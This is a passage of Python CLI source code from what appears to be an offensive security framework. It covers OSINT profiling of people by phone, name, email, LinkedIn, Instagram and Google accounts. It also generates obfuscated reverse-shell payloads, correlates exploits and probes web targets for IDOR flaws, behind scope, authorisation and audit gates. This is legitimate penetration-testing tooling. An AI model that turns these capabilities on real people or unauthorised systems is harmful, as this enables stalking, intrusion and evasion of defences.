    console.print(f"[bold]Phone:[/bold] {number}")
    if parse.get("valid"):
        console.print(f"  region:   {parse.get('region')}")
        console.print(f"  carrier:  {parse.get('carrier')}")
        console.print(f"  type:     {parse.get('line_type')}")
        console.print(f"  format:   {parse.get('international')}")
    else:
        console.print(f"  [yellow]parse error:[/yellow] {parse.get('error')}")
    pi = result.get("phoneinfoga", {})
    if pi:
        if pi.get("available"):
            if "scanners" in pi:
                dc = pi.get("dork_count", {})
                total = pi.get("total_dorks", 0)
                console.print(
                    f"  [green]phoneinfoga scan:[/green] "
                    f"{len(pi['scanners'])} scanner(s), {total} dork URL(s)"
                )
                for scanner, count in dc.items():
                    console.print(f"    {scanner}: {count} dorks")
            elif "error" in pi:
                console.print(f"  [yellow]phoneinfoga error:[/yellow] {pi['error'][:80]}")
        else:
            console.print(f"  [dim]phoneinfoga:[/dim] {pi.get('reason', 'unavailable')}")

    accounts = result.get("accounts", {})
    if accounts:
        console.print(f"[bold]Account existence probes:[/bold]")
        for service, status in accounts.items():
            colour = {
                "REGISTERED": "green",
                "NOT_FOUND": "dim",
                "INVALID_FORMAT": "yellow",
                "UNVERIFIABLE": "dim",
                "UNKNOWN": "yellow",
                "ERROR": "red",
            }.get(status, "dim")
            console.print(f"  [{colour}]{service:<12}[/{colour}] {status}")

    mined = result.get("dork_mining", {})
    if mined and (mined.get("emails_found") or mined.get("usernames_found") or
                  mined.get("sites_searched")):
        console.print(f"[bold]Dork mining (via DDG):[/bold]")
        sites = mined.get("sites_searched", [])
        if sites:
            console.print(f"  sites queried: {', '.join(sites[:6])}"
                          + (f"  (+{len(sites)-6} more)" if len(sites) > 6 else ""))
        emails = mined.get("emails_found", [])
        if emails:
            console.print(f"  [green]emails discovered:[/green] "
                          f"{', '.join(emails[:5])}"
                          + (f"  (+{len(emails)-5} more)" if len(emails) > 5 else ""))
        else:
            console.print(f"  [dim]emails discovered:[/dim] none")
        unames = mined.get("usernames_found", [])
        if unames:
            console.print(f"  [green]usernames discovered:[/green] "
                          f"{', '.join(unames[:5])}"
                          + (f"  (+{len(unames)-5} more)" if len(unames) > 5 else ""))
        else:
            console.print(f"  [dim]usernames discovered:[/dim] none")

    persisted = result.get("persisted", {})
    if persisted:
        console.print(f"[bold]Persisted to engagement DB:[/bold] "
                      f"{persisted.get('emails', 0)} email(s), "
                      f"{persisted.get('social_profiles', 0)} social profile(s)")


@osint_app.command("name")
def osint_name(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    name: str = typer.Option(..., "--name", "-n",
                              help="Full name in quotes, e.g. \"Bryan Seah\"."),
    proxy: Optional[str] = typer.Option(
        None, "--proxy", envvar="FORGE_PROXY",
        help="HTTP/SOCKS proxy for the search queries (e.g. socks5://127.0.0.1:9050 for Tor).",
    ),
    max_concurrency: int = typer.Option(
        1,
        "--max-concurrency",
        envvar="FORGE_NAME_SEARCH_MAX_CONCURRENCY",
        min=1,
        max=3,
        help="Bounded public-search dork concurrency. Defaults to 1 to avoid provider rate limits.",
    ),
) -> None:
    """Full-name OSINT: SearXNG (over Tor if proxied) with site-restricted
    dorks on LinkedIn/GitHub/Twitter/Instagram/Medium/Keybase. Regex-extracts
    candidate profile handles, deduped."""
    from forge.config import ForgeConfig  # noqa: PLC0415
    from forge.utils.intel.name_search import search_name  # noqa: PLC0415

    cfg = ForgeConfig.load()
    db_path = cfg.engagement_db_path(engagement)
    profiles = search_name(
        name=name,
        engagement_id=int(engagement),
        db_path=db_path,
        proxy=proxy,
        max_concurrency=max_concurrency,
    )
    console.print(f"[bold]Name search:[/bold] {name}")
    total = sum(len(v) for v in profiles.values())
    if total == 0:
        console.print("  [dim]no profile candidates surfaced[/dim]")
    for platform, handles in profiles.items():
        if handles:
            console.print(f"  [cyan]{platform}[/cyan]: {', '.join(handles[:5])}"
                          + (f"  (+{len(handles)-5} more)" if len(handles) > 5 else ""))


@osint_app.command("gravatar")
def osint_gravatar(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    emails: Optional[str] = typer.Option(
        None, "--emails",
        help="Comma-separated email list. Defaults to emails already stored in the engagement DB.",
    ),
) -> None:
    """Gravatar public-profile enrichment (Module 2-O).

    For each email, computes MD5 and fetches gravatar.com/<md5>.json.
    Zero API key, zero signup. Yields display name, username, bio,
    location, and linked accounts (Twitter/GitHub/LinkedIn/TikTok/etc.).

    Discovered linked accounts get persisted to social_profiles so the
    kill-chain E5 fan-out picks them up for Sherlock on the next
    iteration.
    """
    from forge.config import ForgeConfig  # noqa: PLC0415
    from forge.utils.intel.gravatar_lookup import (  # noqa: PLC0415
        lookup_gravatar, persist_gravatar_findings,
    )
    import sqlite3 as _sq3  # noqa: PLC0415

    cfg = ForgeConfig.load()
    db_path = cfg.engagement_db_path(engagement)
    eng_id = int(engagement)

    # Determine email list
    if emails:
        email_list = [e.strip() for e in emails.split(",") if e.strip()]
    else:
        con = _sq3.connect(f"file:{db_path.as_posix()}?mode=ro", uri=True)
        try:
            try:
                rows = con.execute(
                    "SELECT DISTINCT email FROM emails WHERE engagement_id=?",
                    (eng_id,),
                ).fetchall()
                email_list = [r[0] for r in rows if r[0] and "@" in r[0]]
            except _sq3.OperationalError:
                email_list = []
        finally:
            con.close()

    if not email_list:
        console.print("[dim]No emails to look up. Pass --emails or seed some first.[/dim]")
        return

    total_hits = 0
    total_new_rows = 0
    gravatar_inputs = email_list[:20]
    identity_workers = _identity_lookup_max_workers()
    gravatar_results = _run_callable_batch(
        gravatar_inputs,
        lambda email: (email, lookup_gravatar(email, eng_id, db_path)),
        max_workers=min(identity_workers, len(gravatar_inputs)),
    )
    for email, result in gravatar_results:
        if result.get("found"):
            total_hits += 1
            p = result["profile"]
            new_rows = persist_gravatar_findings(email, eng_id, db_path, p)
            total_new_rows += new_rows
            console.print(f"[green]HIT[/green] {email}")
            console.print(f"  display: {p.get('display_name', '')}")
            console.print(f"  username: {p.get('preferred_username', '')}")
            if p.get("bio"):
                console.print(f"  bio: {p['bio'][:100]}")
            if p.get("location"):
                console.print(f"  location: {p['location']}")
            for acct in p.get("accounts", []):
                v = "[green]OK[/green]" if acct.get("verified") else "[dim]?[/dim]"
                console.print(f"  {v} {acct.get('domain', '?'):<14} "
                              f"{acct.get('username', '?'):<20} "
                              f"{acct.get('url', '')[:60]}")
        else:
            console.print(f"[dim]MISS {email}[/dim]")
    console.print(f"\n[bold]Summary:[/bold] {total_hits}/{len(gravatar_inputs)} email(s) "
                  f"have Gravatar profiles. {total_new_rows} social_profiles rows written.")


@osint_app.command("google")
def osint_google(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    emails: Optional[str] = typer.Option(
        None, "--emails",
        help="Comma-separated emails. Defaults to emails in the engagement DB.",
    ),
) -> None:
    """Ghunt Google-account enrichment (Module 2-P).

    Uses your ghunt login session (creds.m) to pull Gaia ID, activated
    Google services (Maps/Meet/Drive/Photos/Play Games), public Calendar
    events if any, and Maps review count. Feeds discovered handles back
    to social_profiles so fan-out E5 Sherlocks them next iteration.
    """
    from forge.config import ForgeConfig  # noqa: PLC0415
    from forge.utils.intel.google_account import (  # noqa: PLC0415
        lookup_google_account, persist_google_findings,
        _ghunt_creds_available,
    )
    import sqlite3 as _sq3  # noqa: PLC0415

    cfg = ForgeConfig.load()
    db_path = cfg.engagement_db_path(engagement)
    eng_id = int(engagement)

    if not _ghunt_creds_available():
        console.print("[yellow]Ghunt creds not found.[/yellow] Run `ghunt login` "
                      "first, then paste base64 auth from the Companion extension.")
        return

    if emails:
        email_list = [e.strip() for e in emails.split(",") if e.strip()]
    else:
        con = _sq3.connect(f"file:{db_path.as_posix()}?mode=ro", uri=True)
        try:
            try:
                rows = con.execute(
                    "SELECT DISTINCT email FROM emails WHERE engagement_id=?",
                    (eng_id,),
                ).fetchall()
                email_list = [r[0] for r in rows if r[0] and "@" in r[0]]
            except _sq3.OperationalError:
                email_list = []
        finally:
            con.close()

    if not email_list:
        console.print("[dim]No emails to look up.[/dim]")
        return

    hits = 0
    google_inputs = email_list[:10]  # cap - Ghunt is slow
    identity_workers = _identity_lookup_max_workers()
    google_results = _run_callable_batch(
        google_inputs,
        lambda email: (email, lookup_google_account(email, eng_id, db_path)),
        max_workers=min(identity_workers, len(google_inputs)),
    )
    for email, result in google_results:
        if not result.get("found"):
            reason = result.get("error") or result.get("reason") or "not found"
            console.print(f"[dim]MISS[/dim] {email}  ({reason})")
            continue
        hits += 1
        profile = result.get("profile", {})
        rows_written = persist_google_findings(email, eng_id, db_path, profile)
        console.print(f"[green]HIT[/green] {email}")
        console.print(f"  gaia_id: {profile.get('gaia_id', '')}")
        for k in ("display_name", "last_edit"):
            v = profile.get(k)
            if v:
                console.print(f"  {k}: {v}")
        apps = profile.get("apps", []) or []
        if apps:
            console.print(f"  active services: {', '.join(apps)}")
        console.print(f"  [dim]{rows_written} social_profiles rows written[/dim]")
    console.print(f"\n[bold]Summary:[/bold] {hits}/{len(google_inputs)} Google accounts.")


@osint_app.command("linkedin")
def osint_linkedin(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    domain: str = typer.Option(..., "--domain", "-d",
                                help="Company domain (e.g. acme.com)."),
    max_dorks: int = typer.Option(5, "--max-dorks",
                                    help="Number of dork queries to run."),
    max_concurrency: int = typer.Option(
        1,
        "--max-concurrency",
        envvar="FORGE_LINKEDIN_DORK_MAX_CONCURRENCY",
        min=1,
        max=2,
        help="Bounded LinkedIn public-search dork concurrency. Defaults to 1.",
    ),
) -> None:
    """CrossLinked-style LinkedIn employee discovery (Module 2-Q).

    Uses Google dorks (via DDG/Bing/Startpage) to find `/in/<slug>`
    profiles referencing the target company, parses slugs to
    firstname/lastname pairs, generates candidate emails in 14+
    patterns. Persists candidate emails to `emails` and LinkedIn slugs
    to `social_profiles`.
    """
    from forge.config import ForgeConfig  # noqa: PLC0415
    from forge.utils.intel.linkedin_scraper import (  # noqa: PLC0415
        enumerate_linkedin_employees, persist_linkedin_findings,
    )
    cfg = ForgeConfig.load()
    db_path = cfg.engagement_db_path(engagement)
    result = enumerate_linkedin_employees(
        domain=domain, engagement_id=int(engagement),
        db_path=db_path, max_dorks=max_dorks,
        max_concurrency=max_concurrency,
    )
    counts = persist_linkedin_findings(
        domain=domain, engagement_id=int(engagement),
        db_path=db_path, result=result,
    )
    console.print(f"[bold]LinkedIn scrape for {domain}:[/bold]")
    console.print(f"  raw dork hits:       {result.get('raw_hits', 0)}")
    console.print(f"  linkedin_slugs:      {len(result.get('linkedin_slugs', []))}")
    console.print(f"  parsed names:        {len(result.get('names', []))}")
    console.print(f"  candidate emails:    {len(result.get('candidate_emails', []))}")
    console.print(f"  company_slugs:       {len(result.get('company_slugs', []))}")
    console.print(f"  [dim]persisted -> emails: {counts.get('emails', 0)}, "
                  f"social_profiles: {counts.get('social_profiles', 0)}[/dim]")
    for slug in result.get("linkedin_slugs", [])[:5]:
        console.print(f"    [cyan]{slug}[/cyan]")


@osint_app.command("urlscan")
def osint_urlscan(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    hostname: str = typer.Option(..., "--hostname", "-H",
                                   help="Domain or hostname to search."),
    max_results: int = typer.Option(20, "--max-results",
                                       help="Cap on urlscan search results returned."),
    scope_manifest: Optional[str] = typer.Option(
        None,
        "--scope-manifest",
        help="Scope manifest path/JSON for direct urlscan lookup gating.",
    ),
) -> None:
    """URLScan.io public-search enrichment (Module 2-R).

    Queries urlscan.io for historical scans of a hostname. Extracts
    related domains, unique IPs, tech-stack servers. No API key required
    (rate-limited to 100 searches/day anon).
    """
    from forge.config import ForgeConfig  # noqa: PLC0415
    from forge.utils.intel.urlscan_lookup import (  # noqa: PLC0415
        search_urlscan, persist_urlscan_findings,
    )
    cfg = ForgeConfig.load()
    db_path = cfg.engagement_db_path(engagement)
    _direct_cli_load_scope_lists(
        engagement_id=int(engagement),
        db_path=db_path,
        scope_manifest=scope_manifest,
        target=hostname,
        seed_type="domain",
    )
    result = search_urlscan(hostname, int(engagement), db_path,
                             max_results=max_results)
    counts = persist_urlscan_findings(hostname, int(engagement), db_path, result)
    console.print(f"[bold]URLScan.io for {hostname}:[/bold]")
    console.print(f"  scans returned:      {len(result.get('scans', []))}")
    console.print(f"  unique IPs:          {len(result.get('unique_ips', []))}")
    console.print(f"  related domains:     {len(result.get('related_domains', []))}")
    console.print(f"  distinct servers:    {len(result.get('servers', []))}")
    console.print(f"  [dim]persisted -> hosts_written: {counts.get('hosts_written', 0)}[/dim]")
    for d in result.get("related_domains", [])[:5]:
        console.print(f"    [cyan]{d}[/cyan]")


@osint_app.command("instagram")
def osint_instagram(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    username: str = typer.Option(..., "--username", "-u",
                                    help="Instagram handle without @."),
) -> None:
    """Instagram profile enrichment (Module 2-S).

    Toutatis-style fetch of Instagram's anonymous web_profile_info
    endpoint. Extracts biography, external_url, follower count,
    verified flag, bio_links. Mines emails/URLs from bio, feeds
    discovered emails back into fan-out E on the next iteration.
    """
    from forge.config import ForgeConfig  # noqa: PLC0415
    from forge.utils.intel.instagram_lookup import (  # noqa: PLC0415
        lookup_instagram, persist_instagram_findings,
    )
    cfg = ForgeConfig.load()
    db_path = cfg.engagement_db_path(engagement)
    result = lookup_instagram(username.lstrip("@"), int(engagement), db_path)
    if not result.get("found"):
        reason = result.get("error", "not found or blocked")
        console.print(f"[dim]MISS[/dim] @{username}  ({reason})")
        return
    counts = persist_instagram_findings(username.lstrip("@"),
                                          int(engagement), db_path, result)
    p = result.get("profile", {})
    console.print(f"[green]HIT[/green] @{username}")
    console.print(f"  full_name:      {p.get('full_name', '')}")
    console.print(f"  is_verified:    {p.get('is_verified', False)}")
    console.print(f"  is_business:    {p.get('is_business', False)}")
    console.print(f"  follower_count: {p.get('follower_count', 0)}")
    if p.get("biography"):
        console.print(f"  bio:            {p['biography'][:100]}")
    if p.get("external_url"):
        console.print(f"  external_url:   {p['external_url']}")
    ems = p.get("emails_in_bio", [])
    if ems:
        console.print(f"  [green]emails discovered:[/green] {', '.join(ems)}")
    console.print(f"  [dim]persisted -> emails: {counts.get('emails', 0)}, "
                  f"social_profiles: {counts.get('social_profiles', 0)}[/dim]")


@osint_app.command("shodan")
def osint_shodan(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    target: str = typer.Option(..., "--target", "-t",
                                 help="IP address OR domain."),
    scope_manifest: Optional[str] = typer.Option(
        None,
        "--scope-manifest",
        help="Scope manifest path/JSON for direct Shodan lookup gating.",
    ),
) -> None:
    """Shodan enrichment (Module 2-T).

    Uses FORGE_SHODAN_API_KEY from env. For domains: enumerates
    subdomains + DNS records via the free /dns/domain endpoint. For
    IPs: pulls port/service banners + known CVEs. Persists all
    discoveries to hosts/services/audit_log so kill-chain fan-outs pick
    them up next iteration.
    """
    from forge.config import ForgeConfig  # noqa: PLC0415
    from forge.utils.intel.shodan_lookup import (  # noqa: PLC0415
        lookup_shodan_host, lookup_shodan_domain, persist_shodan_findings,
        _shodan_key,
    )
    if not _shodan_key():
        console.print("[yellow]No FORGE_SHODAN_API_KEY in env.[/yellow]")
        return

    cfg = ForgeConfig.load()
    db_path = cfg.engagement_db_path(engagement)
    eng_id = int(engagement)
    try:
        ipaddress.ip_address(target.strip())
        seed_type = "ipv4"
    except ValueError:
        seed_type = "domain"
    _direct_cli_load_scope_lists(
        engagement_id=eng_id,
        db_path=db_path,
        scope_manifest=scope_manifest,
        target=target,
        seed_type=seed_type,
    )

    # Detect IP vs domain
    try:
        ipaddress.ip_address(target.strip())
        is_ip = True
    except ValueError:
        is_ip = False
    host_result: dict = {}
    domain_result: dict = {}
    if is_ip:
        host_result = lookup_shodan_host(target, eng_id, db_path)
    else:
        domain_result = lookup_shodan_domain(target, eng_id, db_path)
    counts = persist_shodan_findings(target, eng_id, db_path,
                                       host_result, domain_result)
    console.print(f"[bold]Shodan for {target} ({'IP' if is_ip else 'domain'}):[/bold]")
    if is_ip and host_result.get("found"):
        h = host_result.get("host", {})
        console.print(f"  org:        {h.get('org', '')}")
        console.print(f"  isp:        {h.get('isp', '')}")
        console.print(f"  country:    {h.get('country_name', '')}")
        console.print(f"  ports:      {h.get('ports', [])}")
        console.print(f"  hostnames:  {h.get('hostnames', [])}")
        cves = h.get("cves", [])
        if cves:
            console.print(f"  [red]CVEs:[/red] {', '.join(cves[:10])}")
    elif not is_ip:
        subs = domain_result.get("subdomains", []) or []
        console.print(f"  subdomains discovered: {len(subs)}")
        for s in subs[:10]:
            console.print(f"    [cyan]{s}[/cyan]")
        recs = domain_result.get("records", []) or []
        console.print(f"  DNS records:           {len(recs)}")
    console.print(f"  [dim]persisted -> hosts: {counts.get('hosts_inserted', 0)}, "
                  f"services: {counts.get('services_inserted', 0)}, "
                  f"CVEs: {len(counts.get('cves', []))}[/dim]")


@osint_app.command("social")
def osint_social(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    emails: Optional[str] = typer.Option(
        None,
        "--emails",
        help="Comma-separated email list. Defaults to emails already stored in the engagement DB.",
    ),
    proxy: Optional[str] = typer.Option(
        None, "--proxy", envvar="FORGE_PROXY",
        help="Optional HTTP/SOCKS proxy for Epieos requests.",
    ),
    max_concurrency: int = typer.Option(
        1,
        "--max-concurrency",
        envvar="FORGE_EPIEOS_MAX_CONCURRENCY",
        min=1,
        max=4,
        help="Bounded Epieos lookup concurrency. Defaults to 1.",
    ),
    dry_run: bool = typer.Option(False, "--dry-run"),
) -> None:
    """Enumerate social-media presence for target emails via Epieos (Module 2-G).

    All queries pass through the engagement scope gate. Results land in the
    ``social_profiles`` table with a hash-chained audit log entry per email.
    """
    from forge.config import ForgeConfig  # noqa: PLC0415
    from forge.utils.intel.social_scraper import run_social_scraper  # noqa: PLC0415

    cfg = ForgeConfig.load()
    db_path = cfg.engagement_db_path(engagement)
    engagement_id = int(engagement)

    email_list = [e.strip() for e in emails.split(",")] if emails else None
    _cli_audit(
        db_path, engagement_id, "phase2", "social_scraper",
        "social_start",
        target=",".join(email_list) if email_list else "<from-db>",
        result=f"dry_run={dry_run}",
    )
    try:
        n = run_social_scraper(
            db_path=db_path,
            engagement_id=engagement_id,
            emails=email_list,
            proxy=proxy,
            dry_run=dry_run,
            operator=cfg.operator,
            max_concurrency=max_concurrency,
        )
    except Exception as exc:
        _cli_audit(
            db_path, engagement_id, "phase2", "social_scraper",
            "social_failed", result=f"{type(exc).__name__}: {str(exc)[:180]}",
        )
        raise
    _cli_audit(
        db_path, engagement_id, "phase2", "social_scraper",
        "social_complete", result=f"profiles_written={n}",
    )
    console.print(f"[green]Epieos complete.[/green] Social profiles upserted: {n}")


@osint_app.command("usernames")
def osint_usernames(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    username: Optional[str] = typer.Option(
        None, "--username", "-u",
        help="Single username to enumerate. Mutually inclusive with --usernames.",
    ),
    usernames: Optional[str] = typer.Option(
        None, "--usernames",
        help="Comma-separated list of usernames.",
    ),
    backend: Optional[str] = typer.Option(
        None, "--backend",
        help="Backend preference: whatsmyname | maigret | sherlock. Default: auto-select.",
    ),
    proxy_file: Optional[str] = typer.Option(
        None, "--proxy-file",
        help="Path to a newline-delimited proxy list for rotation.",
    ),
    max_workers: int = typer.Option(
        1,
        "--max-workers",
        envvar="FORGE_HANDLE_FINDER_MAX_WORKERS",
        min=1,
        max=4,
        help="Bounded username-enumeration worker count. Defaults to 1.",
    ),
    dry_run: bool = typer.Option(False, "--dry-run"),
) -> None:
    """Enumerate usernames across social sites via WhatsMyName / Maigret / Sherlock (Module 2-H).

    Requires one of ``whatsmyname``, ``maigret`` or ``sherlock`` on PATH (or
    installed into the active venv). Recommended:
    ``pip install sherlock-project maigret holehe`` - all three land in the
    venv Scripts/ dir and are auto-detected.
    """
    from pathlib import Path as _Path  # noqa: PLC0415
    from forge.config import ForgeConfig  # noqa: PLC0415
    from forge.utils.intel.handle_finder import run_handle_finder  # noqa: PLC0415

    cfg = ForgeConfig.load()
    db_path = cfg.engagement_db_path(engagement)
    engagement_id = int(engagement)

    name_list: list[str] = []
    if usernames:
        name_list.extend([n.strip() for n in usernames.split(",") if n.strip()])
    if username:
        name_list.append(username)
    if not name_list:
        console.print(
            "[bold red]ERROR:[/bold red] specify --username and/or --usernames"
        )
        raise typer.Exit(code=2)

    _cli_audit(
        db_path, engagement_id, "phase2", "handle_finder",
        "usernames_start", target=",".join(name_list),
        result=f"dry_run={dry_run} backend={backend or 'auto'}",
    )
    try:
        n = run_handle_finder(
            db_path=db_path,
            engagement_id=engagement_id,
            usernames=name_list,
            proxy_file=_Path(proxy_file) if proxy_file else None,
            dry_run=dry_run,
            operator=cfg.operator,
            backend=backend,
            max_workers=max_workers,
        )
    except TypeError:
        # run_handle_finder may not accept backend= kwarg in older signatures;
        # fall back to positional-friendly call.
        n = run_handle_finder(
            db_path=db_path,
            engagement_id=engagement_id,
            usernames=name_list,
            proxy_file=_Path(proxy_file) if proxy_file else None,
            dry_run=dry_run,
            operator=cfg.operator,
        )
    except Exception as exc:
        _cli_audit(
            db_path, engagement_id, "phase2", "handle_finder",
            "usernames_failed", result=f"{type(exc).__name__}: {str(exc)[:180]}",
        )
        raise
    _cli_audit(
        db_path, engagement_id, "phase2", "handle_finder",
        "usernames_complete", result=f"profiles_written={n}",
    )
    console.print(f"[green]Username enum complete.[/green] Profiles upserted: {n}")


# ---------------------------------------------------------------------------
# Phase 3 — Evasion & Payload Generation
# ---------------------------------------------------------------------------


@evasion_app.command("generate")
def evasion_generate(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    technique: str = typer.Option(..., "--technique", help="Obfuscation technique identifier."),
    target_os: str = typer.Option("windows", "--os", help="windows|linux|macos"),
    strip_metadata: bool = typer.Option(True, "--strip-metadata/--no-strip-metadata"),
) -> None:
    """Generate an obfuscated payload using the 6-criterion matrix (Phase 3)."""
    import os  # noqa: PLC0415

    from forge.config import is_offensive_enabled, prompt_offensive_upgrade  # noqa: PLC0415

    if not is_offensive_enabled():
        if not prompt_offensive_upgrade("Phase 3 payload generation"):
            console.print(
                "[bold red]ERROR:[/bold red] Phase 3 payload generation is disabled "
                "(FORGE_SAFE_MODE=1). Set FORGE_SAFE_MODE=0 to enable offensive modules."
            )
            raise typer.Exit(code=1)

    from forge.phase3.payload_builder import EncodingChain, PayloadBuilder  # noqa: PLC0415

    cfg = ForgeConfig.load()
    out_dir = cfg.templates_dir(engagement)
    out_dir.mkdir(parents=True, exist_ok=True)

    os_key = (target_os or "windows").strip().lower()
    template_by_os = {
        "windows": "powershell_reverse.j2",
        "linux": "bash_reverse.j2",
        "macos": "python_reverse.j2",
    }
    template_name = template_by_os.get(os_key)
    if template_name is None:
        console.print(f"[bold red]ERROR:[/bold red] Unsupported target OS: {target_os!r}")
        raise typer.Exit(code=1)

    chain = EncodingChain()
    technique_key = (technique or "").strip().lower()
    steps_by_technique = {
        "ps_obf": ["base64", "char_insert"],
        "bash_obf": ["gzip_b64", "char_insert"],
        "py_obf": ["base64", "xor"],
        "std": ["base64"],
    }
    for step in steps_by_technique.get(technique_key, ["base64"]):
        chain.add(step)

    lhost = os.environ.get("FORGE_LHOST", "127.0.0.1")
    lport = int(os.environ.get("FORGE_LPORT", "443"))

    builder = PayloadBuilder(
        obfuscate=True,
        stealth_level=4 if strip_metadata else 3,
    )
    payload = builder.build(
        template_name=template_name,
        context={"lhost": lhost, "lport": lport},
        chain=chain,
        lport=lport,
    )
    output_path = out_dir / f"phase3_{technique_key or 'std'}_{os_key}.txt"
    sha256 = builder.write_payload(payload, output_path=output_path, use_encoded=True)
    console.print(f"[green]Payload generated:[/green] {output_path}")
    console.print(f"[green]SHA256:[/green] {sha256}")


# ---------------------------------------------------------------------------
# Phase 4 — Exploit Correlation & Vulnerability Discovery
# ---------------------------------------------------------------------------


@exploit_app.command("correlate")
def exploit_correlate(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    host: Optional[str] = typer.Option(None, "--host"),
) -> None:
    """Correlate discovered services with Exploit-DB and NVD (Phase 4)."""
    from forge.phase4.exploit_correlator import ExploitCorrelator  # noqa: PLC0415

    cfg = ForgeConfig.load()
    db_path = cfg.engagement_db_path(engagement)
    engagement_id = int(engagement)

    _cli_audit(
        db_path, engagement_id, "phase4", "exploit_correlator",
        "correlate_start", target=host,
    )

    with sqlite3.connect(db_path) as con:
        try:
            con.execute(
                "DELETE FROM exploit_suggestions WHERE engagement_id=?",
                (engagement_id,),
            )
            con.commit()
        except sqlite3.OperationalError:
            pass

    try:
        correlator = ExploitCorrelator(
            db_path=db_path,
            engagement_id=engagement_id,
            cache_db=cfg.exploitdb_path,
        )
    except sqlite3.OperationalError as exc:
        _cli_audit(
            db_path, engagement_id, "phase4", "exploit_correlator",
            "correlate_skipped", target=host,
            result=f"cache_open_failed: {type(exc).__name__}: {str(exc)[:120]}",
        )
        console.print(
            "[yellow]WARNING:[/yellow] Exploit-DB cache missing; skipping correlate. "
            "Run 'forge kb sync --source exploitdb --force' to enable."
        )
        console.print("[green]Exploit suggestions generated:[/green] 0")
        return
    try:
        suggestions = correlator.correlate_all()
        if host:
            with sqlite3.connect(db_path) as con:
                try:
                    ids = con.execute(
                        """
                        SELECT id
                        FROM hosts
                        WHERE engagement_id=?
                          AND (ip=? OR hostname=?)
                        """,
                        (engagement_id, host, host),
                    ).fetchall()
                except sqlite3.OperationalError:
                    ids = con.execute(
                        """
                        SELECT id
                        FROM hosts
                        WHERE engagement_id=?
                          AND ip=?
                        """,
                        (engagement_id, host),
                    ).fetchall()
                allowed_ids = [row[0] for row in ids]
                if not allowed_ids:
                    console.print(
                        f"[yellow]No host matched filter {host!r}; no suggestions kept.[/yellow]"
                    )
                    con.execute(
                        "DELETE FROM exploit_suggestions WHERE engagement_id=?",
                        (engagement_id,),
                    )
                else:
                    placeholders = ",".join(["?"] * len(allowed_ids))
                    con.execute(
                        f"""
                        DELETE FROM exploit_suggestions
                        WHERE engagement_id=?
                          AND host_id NOT IN ({placeholders})
                        """,
                        (engagement_id, *allowed_ids),
                    )
                con.commit()
        console.print(f"[green]Exploit suggestions generated:[/green] {len(suggestions)}")
        _cli_audit(
            db_path, engagement_id, "phase4", "exploit_correlator",
            "correlate_complete", target=host,
            result=f"suggestions={len(suggestions)}",
        )
    except Exception as exc:
        _cli_audit(
            db_path, engagement_id, "phase4", "exploit_correlator",
            "correlate_failed", target=host,
            result=f"{type(exc).__name__}: {str(exc)[:180]}",
        )
        raise
    finally:
        correlator.close()


# ---------------------------------------------------------------------------
# Phase 4 — Web Vulnerability Discovery (vuln sub-app)
# ---------------------------------------------------------------------------


@vuln_app.command("idor")
def vuln_idor(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    target: str = typer.Option(..., "--target", help="Base URL of target application."),
    depth: int = typer.Option(3, "--depth", help="Maximum crawl depth."),
    delay: float = typer.Option(1.5, "--delay", help="Seconds between requests."),
    cookie: Optional[str] = typer.Option(None, "--cookie", help="Path to cookie jar file."),
    header: Optional[str] = typer.Option(
        None,
        "--header",
        help='Extra auth header, e.g. "Authorization: Bearer tok".',
    ),
    dry_run: bool = typer.Option(False, "--dry-run"),
    roe_id: Optional[str] = typer.Option(
        None,
        "--roe-id",
        envvar="FORGE_ROE_ID",
        help="ROE identifier required before direct live IDOR probes.",
    ),
    scope_manifest: Optional[str] = typer.Option(
        None,
        "--scope-manifest",
        help="Scope manifest path/JSON for direct live IDOR scan gating.",
    ),
) -> None:
    """Discover IDOR vulnerabilities by crawling and probing ID parameters (Module 4-D).

    OPSEC: Sends real HTTP requests to the target. Requires explicit engagement
    authorisation covering this application. A questionary.confirm() prompt is
    shown before scanning begins.
    """
    from forge.config import ForgeConfig  # noqa: PLC0415
    from forge.phase4.param_probe import IDORScanner  # noqa: PLC0415

    cfg = ForgeConfig.load()
    db_path = cfg.engagement_db_path(engagement)
    if not dry_run:
        _direct_cli_require_roe(roe_id, command_name="vuln idor")
    scope_values, url_prefixes = _direct_cli_load_scope_lists(
        engagement_id=int(engagement),
        db_path=db_path,
        scope_manifest=scope_manifest,
        target=target,
        seed_type="url",
    )
    scanner = IDORScanner(db_path=db_path, engagement_id=int(engagement))
    scanner.scan(
        target_url=target,
        depth=depth,
        delay=delay,
        cookie_jar=Path(cookie) if cookie else None,
        extra_header=header,
        dry_run=dry_run,
        scope_values=scope_values,
        url_prefixes=url_prefixes,
        require_scope=True,
    )


@vuln_app.command("passive")
def vuln_passive(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    target: Optional[str] = typer.Option(None, "--target"),
    input_file: Optional[str] = typer.Option(None, "--input-file"),
    proxy: Optional[str] = typer.Option(None, "--proxy"),
    max_workers: Optional[int] = typer.Option(
        None,
        "--max-workers",
        min=1,
        max=4,
        help=(
            "Max workers for engagement-backed passive HTTP collection. "
            "Defaults to FORGE_PASSIVE_HTTP_MAX_WORKERS or 1."
        ),
    ),
    scope_manifest: Optional[str] = typer.Option(
        None,
        "--scope-manifest",
        help="Scope manifest path/JSON for direct passive HTTP collection gating.",
    ),
) -> None:
    from forge.phase2.xray_runner import (  # noqa: PLC0415
        ingest_passive_file,
        run_passive_http_collection,
        run_passive_http_collection_for_engagement,
    )

    cfg = ForgeConfig.load()
    db_path = cfg.engagement_db_path(engagement)
    passive_max_workers = max_workers if isinstance(max_workers, int) else None
    inserted = 0
    if input_file:
        inserted += ingest_passive_file(int(engagement), db_path, Path(input_file))
    if target:
        _direct_cli_load_scope_lists(
            engagement_id=int(engagement),
            db_path=db_path,
            scope_manifest=scope_manifest,
            target=target,
            seed_type="url",
        )
        inserted += run_passive_http_collection(
            int(engagement),
            db_path=db_path,
            target_url=target,
            proxy=proxy,
        )
    if not input_file and not target:
        inserted += run_passive_http_collection_for_engagement(
            int(engagement),
            db_path=db_path,
            proxy=proxy,
